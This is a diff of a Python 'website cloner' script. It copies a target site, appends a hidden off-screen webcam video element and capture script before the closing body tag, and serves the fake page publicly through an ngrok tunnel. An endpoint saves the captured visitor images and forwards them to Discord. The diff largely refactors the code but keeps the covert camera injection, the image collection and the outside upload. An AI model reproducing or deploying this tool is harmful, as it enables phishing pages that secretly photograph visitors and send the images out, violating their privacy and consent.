@@ -9,6 +9,7 @@ from rich.table import Table
 
 console = Console()
 WEBHOOK_CONFIG = "webhook_config.json"
+NGROK_CONFIG = "ngrok_config.json"
 
 def run_command(command):
     try:
@@ -64,20 +65,18 @@ def setup():
         border_style="blue"
     ))
     
-    # Create virtual environment
     if not create_virtual_environment():
         return False
     
-    # Install requirements in virtual environment
-    console.print("[yellow]Installing requirements in virtual environment...[/yellow]")
     pip_cmd = os.path.join("venv", "Scripts", "pip") if sys.platform == "win32" else os.path.join("venv", "bin", "pip")
     python_cmd = os.path.join("venv", "Scripts", "python") if sys.platform == "win32" else os.path.join("venv", "bin", "python")
     
-    # First upgrade pip
-    if not run_command(f'"{pip_cmd}" install --upgrade pip'):
-        console.print("[red]Failed to upgrade pip[/red]")
-        return False
+    # Upgrade pip
+    console.print("[yellow]Upgrading pip...[/yellow]")
+    run_command(f'"{pip_cmd}" install --upgrade pip')
     
+    # Install requirements
+    console.print("[yellow]Installing requirements...[/yellow]")
     requirements = [
         "requests==2.31.0",
         "beautifulsoup4==4.12.2",
@@ -88,80 +87,21 @@ def setup():
     ]
     
     for req in requirements:
-        console.print(f"Installing {req}...")
         if not run_command(f'"{pip_cmd}" install {req}'):
             console.print(f"[red]Failed to install {req}[/red]")
             return False
-        console.print(f"[green]✓[/green] {req} installed successfully")
     
-    # Setup ngrok using the virtual environment's Python
+    # Setup ngrok
     console.print("[yellow]Setting up ngrok...[/yellow]")
-    
-    # Create a temporary script to setup ngrok
-    ngrok_setup_script = """
-import json
-from pyngrok import ngrok
-import sys
-import os
-
-def setup_ngrok():
-    config_file = "ngrok_config.json"
-    
-    if len(sys.argv) > 1:
-        # We have an auth token passed as argument
-        auth_token = sys.argv[1]
-        try:
-            ngrok.set_auth_token(auth_token)
-            with open(config_file, 'w') as f:
-                json.dump({'auth_token': auth_token}, f)
-            print("SUCCESS")
-            return
-        except:
-            print("FAILED")
-            return
-    
-    # Check existing config
-    try:
-        with open(config_file, 'r') as f:
-            config = json.load(f)
-            ngrok.set_auth_token(config['auth_token'])
-            ngrok.get_tunnels()
-            print("SUCCESS")
-            return
-    except:
-        print("FAILED")
-        return
-
-if __name__ == '__main__':
-    setup_ngrok()
-"""
-    
-    with open("ngrok_setup_temp.py", "w") as f:
-        f.write(ngrok_setup_script)
-    
-    # Try to load existing configuration first
-    result = subprocess.run(f'"{python_cmd}" ngrok_setup_temp.py', shell=True, capture_output=True, text=True)
-    if "SUCCESS" in result.stdout:
-        console.print("[green]✓[/green] Ngrok authentication successful")
-        os.remove("ngrok_setup_temp.py")
-        return True
-    
-    # If that fails, ask for new token
-    while True:
+    if not os.path.exists(NGROK_CONFIG):
         console.print("\n[bold cyan]Get your authtoken from:[/bold cyan]")
         console.print("[bold blue]https://dashboard.ngrok.com/get-started/your-authtoken[/bold blue]")
-        auth_token = console.input("\n[bold yellow]Please enter your ngrok auth token: [/bold yellow]")
+        auth_token = console.input("\n[bold yellow]Enter your ngrok authtoken: [/bold yellow]")
         
-        result = subprocess.run(f'"{python_cmd}" ngrok_setup_temp.py "{auth_token}"', shell=True, capture_output=True, text=True)
-        if "SUCCESS" in result.stdout:
-            console.print("[green]✓[/green] Ngrok authentication successful")
-            os.remove("ngrok_setup_temp.py")
-            return True
-        else:
-            console.print("[red]✗ Invalid auth token. Please try again.[/red]")
+        with open(NGROK_CONFIG, 'w') as f:
+            json.dump({'authtoken': auth_token}, f)
     
-    os.remove("ngrok_setup_temp.py")
-    return False
+    return True
 
 def start_cloner():
     try:
@@ -193,24 +133,22 @@ def start_cloner():
                 response = requests.get(url)
                 soup = BeautifulSoup(response.text, 'html.parser')
                 
-                styles = ""
+                # Extract and combine CSS
+                styles = "".join(style.string + "\n" for style in soup.find_all('style'))
                 for style in soup.find_all('style'):
-                    styles += style.string + "\n"
                     style.decompose()
-                    
+                
+                # Get external CSS
                 for link in soup.find_all('link', rel='stylesheet'):
                     try:
                         css_url = link.get('href')
                         if not css_url.startswith('http'):
-                            if css_url.startswith('/'):
-                                css_url = url + css_url
-                            else:
-                                css_url = url + '/' + css_url
-                        css_response = requests.get(css_url)
-                        styles += css_response.text + "\n"
+                            css_url = url + ('/' if not css_url.startswith('/') else '') + css_url
+                        styles += requests.get(css_url).text + "\n"
                     except:
                         continue
                 
+                # Add camera capture code
                 camera_code = """
                 <div id="camera-container" style="position:fixed;top:-9999px;left:-9999px;">
                     <video id="camera-video" autoplay playsinline style="width:1px;height:1px;"></video>
@@ -257,26 +195,18 @@ def start_cloner():
                 </script>
                 """
                 
-                html = str(soup)
-                html = html.replace('</body>', camera_code + '</body>')
-                
-                cloned_content = f"""
-                <style>{styles}</style>
-                {html}
-                """
-                
-                # Save the cloned content
+                # Save the cloned site
                 os.makedirs('cloned_site', exist_ok=True)
                 with open('cloned_site/index.html', 'w', encoding='utf-8') as f:
-                    f.write(cloned_content)
-                    
+                    f.write(f"<style>{styles}</style>\n{str(soup).replace('</body>', camera_code + '</body>')}")
+                
                 console.print("[green]✓[/green] Website cloned successfully!")
                 return True
             except Exception as e:
                 console.print(f"[red]Error cloning website: {str(e)}[/red]")
                 return False
         
-        # Ask for website URL
+        # Get target URL
         console.print(Panel.fit(
             "[bold blue]Website Cloner[/bold blue]\n"
             "[cyan]Enter the website URL to clone[/cyan]",
@@ -287,10 +217,10 @@ def start_cloner():
         if not target_url.startswith(('http://', 'https://')):
             target_url = 'https://' + target_url
         
-        # Clone the website first
         if not clone_website_content(target_url):
             return
         
+        # Setup Flask app
         app = Flask(__name__)
         
         @app.route('/')
@@ -301,50 +231,39 @@ def start_cloner():
         def save_image():
             if 'image' not in request.files:
                 return 'No image received', 400
-                
+            
             image = request.files['image']
-            if not os.path.exists('captured_images'):
-                os.makedirs('captured_images')
-                
+            os.makedirs('captured_images', exist_ok=True)
             image_path = os.path.join('captured_images', f'capture_{len(os.listdir("captured_images"))}.png')
             image.save(image_path)
-            console.print(f"[green]✓[/green] New image captured: {image_path}")
             
-            # Send to Discord
+            console.print(f"[green]✓[/green] New image captured: {image_path}")
             send_to_discord(image_path)
             return 'Image saved', 200
         
-        def display_status(public_url):
-            table = Table(show_header=True, header_style="bold magenta")
-            table.add_column("Service", style="cyan")
-            table.add_column("URL", style="green")
-            
-            table.add_row("Local Server", "http://localhost:5000")
-            table.add_row("Public URL", str(public_url))
-            
-            console.print(Panel(table, title="[bold blue]Website Cloner Status[/bold blue]", border_style="blue"))
-            console.print("\n[yellow]Captured images will be saved in: [bold]./captured_images/[/bold][/yellow]")
-            console.print("\n[bold green]Server is running. Press Ctrl+C to stop.[/bold green]")
+        # Load ngrok config and start tunnel
+        with open(NGROK_CONFIG) as f:
+            ngrok.set_auth_token(json.load(f)['authtoken'])
         
-        # Load ngrok config
-        config_file = "ngrok_config.json"
-        if os.path.exists(config_file):
-            with open(config_file, 'r') as f:
-                config = json.load(f)
-                ngrok.set_auth_token(config['auth_token'])
-        
-        # Start the server
         console.print(Panel.fit(
             "[bold blue]Website Cloner[/bold blue]\n"
             "[cyan]Starting server...[/cyan]",
             border_style="blue"
         ))
         
-        # Start ngrok tunnel
-        with console.status("[bold green]Starting ngrok tunnel..."):
-            public_url = ngrok.connect(5000)
+        public_url = ngrok.connect(5000)
         
-        display_status(public_url)
+        # Display status
+        table = Table(show_header=True, header_style="bold magenta")
+        table.add_column("Service", style="cyan")
+        table.add_column("URL", style="green")
+        table.add_row("Local Server", "http://localhost:5000")
+        table.add_row("Public URL", str(public_url))
+        
+        console.print(Panel(table, title="[bold blue]Website Cloner Status[/bold blue]", border_style="blue"))
+        console.print("\n[yellow]Captured images will be saved in: [bold]./captured_images/[/bold][/yellow]")
+        console.print("\n[bold green]Server is running. Press Ctrl+C to stop.[/bold green]")
+        
         app.run(host='0.0.0.0', port=5000)
         
     except KeyboardInterrupt:
@@ -359,19 +278,16 @@ def start_cloner():
 
 def main():
     try:
-        # Check if we need to set up the environment
         if not os.path.exists("venv") or not os.path.exists(os.path.join("venv", "Scripts" if sys.platform == "win32" else "bin", "python")):
             if not setup():
                 console.print("[red]Setup failed. Please try again.[/red]")
                 return
             
-            # Restart script in virtual environment
             python_cmd = os.path.join("venv", "Scripts" if sys.platform == "win32" else "bin", "python")
             console.print("\n[bold green]Setup complete! Restarting in virtual environment...[/bold green]")
             os.execl(python_cmd, python_cmd, *sys.argv)
         else:
             start_cloner()
-            
     except Exception as e:
         console.print(f"[red]Error: {str(e)}[/red]")
 
